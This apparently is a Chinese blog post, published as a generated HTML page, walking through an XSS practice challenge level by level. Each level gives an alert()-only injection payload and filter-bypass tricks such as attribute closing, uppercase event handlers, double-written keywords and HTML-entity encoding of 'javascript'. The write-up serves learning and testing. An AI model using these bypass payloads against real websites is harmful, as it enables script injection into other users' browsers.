@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="shudba">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="xss攻击（一）">
+  <meta property="og:description" content="The harder,the luckier!">
+  <meta property="og:site_name" content="wwww">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="https://shud.github.io">
+  
+    <link rel="alternate" href="/atom.xml" title="wwww" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>wwww</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">xss攻击（一）</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/<your-github-username>">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By shudba</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-06-11</span>
+            <span class="time">21:16:24</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><p><strong>前言:</strong>   xss也是web安全中的一种常见的攻击方式，想要学习，就先要了解是什么。<br>   xss攻击的定义：</p>
+<blockquote>
+<p> XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets,<br>CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p>
+</blockquote>
+<p>只是看概念是没意思的，要想真正的了解就要通过练习题目才能更加具体的感受。</p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a><strong>level1</strong></h2><p><img src="https://img-blog.csdnimg.cn/20190611200156454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3d3d4aWFvYmFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一题非常简单就用，最普通的注入语句就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/hacker)&lt;/scrip&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a><strong>level 2</strong></h2><p>输入了简单的注入语句后，查看源代码<br><img src="https://img-blog.csdnimg.cn/20190611200955124.PNG" alt="在这里插入图片描述"><br>要想语句起作用，就要把<code>input</code>给闭合掉，可输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a><strong>level3</strong></h2><p>输入简单注入语句后查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&apos;&amp;lt;script&amp;gt;alert(/hacker/)&amp;lt;/script&amp;gt;&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出<code>&lt;</code>和<code>&gt;</code>被转义<br>就可以用另一种攻击方式，用onclick 事件，onclick 事件会在元素被点击时发生。onclick 事件直接包含在&lt;&gt;内，并且可以被执行。再观察页面源代码，是单引号，那就在前面加’把value给闭合掉。<br><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onclick=&apos;javascript:alert(/hacker/&gt;&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a><strong>level 4</strong></h2><p><img src="https://img-blog.csdnimg.cn/20190611202606349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3d3d4aWFvYmFp,size_16,color_FFFFFF,t_70" alt><br>输入简单的注入语句后查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;scriptalert(/hacker/)/script&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
+<p>观察到&lt;和&gt;直接被过滤掉了<br>那就用onclick 事件，这里是双引号，那就在前面输入”，把value给闭合掉。<br><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;javascript:alert(/hacker/)&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>输入<code>onclick</code>注入语句后查看源代码<br><img src="https://img-blog.csdnimg.cn/20190611203015802.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3d3d4aWFvYmFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现on中多了一个下划线，所以过滤了onclick事件，试试script,再看页面源代码，发现script也被过滤掉了。<br>那就用<code>&lt;a&gt;</code>标签构造攻击语句试试。<br><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;hacker&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>也可以再后面加上<code>//</code>注释掉后面的<code>&quot;/</code>，以免对前面的语句产生影响</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>输入onclick语句查看源代码发现被过滤，</p>
+<p><img src="https://img-blog.csdnimg.cn/20190611203816101.PNG" alt="在这里插入图片描述">再输入<code>&lt;a&gt;</code>标签语句查看源代码发现也被过滤了<br><img src="https://img-blog.csdnimg.cn/20190611203714655.PNG" alt="在这里插入图片描述"><br>这里过滤的是onclick,看到说可以改为大写试一下<br><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;ONCLICK=&quot;javascript:alert(/hacker/)&quot;</span><br></pre></td></tr></table></figure>
+<p>看到有大佬还能用这样的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg x=&quot;&quot; Onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>输入scrip语句后查看源代码<br><img src="https://img-blog.csdnimg.cn/2019061120423431.PNG" alt="在这里插入图片描述"><br>可以看出&lt;和&gt;被过滤掉了，连关键字也被过滤掉了<br>可以用双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>
+<p><em>这样是让其过滤掉中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。</em></p>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>输入了script语句查看源代码<br><img src="https://img-blog.csdnimg.cn/20190611204751319.PNG" alt="在这里插入图片描述">可以看出script被过滤掉了，在这里应当用<code>&lt;a&gt;</code>标签语句，仔细看它也是有友情提示的，这里已经有<code>&lt;a&gt;</code>标签，那么只用输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/hacker/)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190611205304910.PNG" alt="在这里插入图片描述"><br>查看源代码后发现script被过滤，换一种方式表达<code>script</code><br>可以采用<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">HTML字符实体转换</a><br><img src="https://img-blog.csdnimg.cn/20190611205601480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3d3d4aWFvYmFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)</span><br></pre></td></tr></table></figure>
+<p>方法二：用 html 的自解码机制就可以绕过（我倒是不会）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;ipt:alert(0)</span><br></pre></td></tr></table></figure>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>输入注入语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/hacker/)</span><br></pre></td></tr></table></figure>
+<p>查看源代码<br><img src="https://img-blog.csdnimg.cn/20190611205956741.PNG" alt="在这里插入图片描述"><br>输入的语句并没有进入到 <code>&lt;a&gt;</code>标签中，这里应该对格式有一定要求，在这里也有提示，要在后面输入<code>http://</code>否则不合法。<br><strong><em>payload</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)//http://</span><br></pre></td></tr></table></figure>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p><img src="https://img-blog.csdnimg.cn/20190611210350364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3d3d4aWFvYmFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这道题连输入都没有，查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>可以先找到注入口<br><img src="https://img-blog.csdnimg.cn/20190611210816679.png" alt="在这里插入图片描述"><br>在查看源代码<br><img src="https://img-blog.csdnimg.cn/20190611210856546.png" alt="在这里插入图片描述"><br>可以看到<code>t_sort</code>就是注入口了<br><img src="https://img-blog.csdnimg.cn/20190611211156795.png" alt="在这里插入图片描述"><br>就可以了！<br>继续加油，未完待续！</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
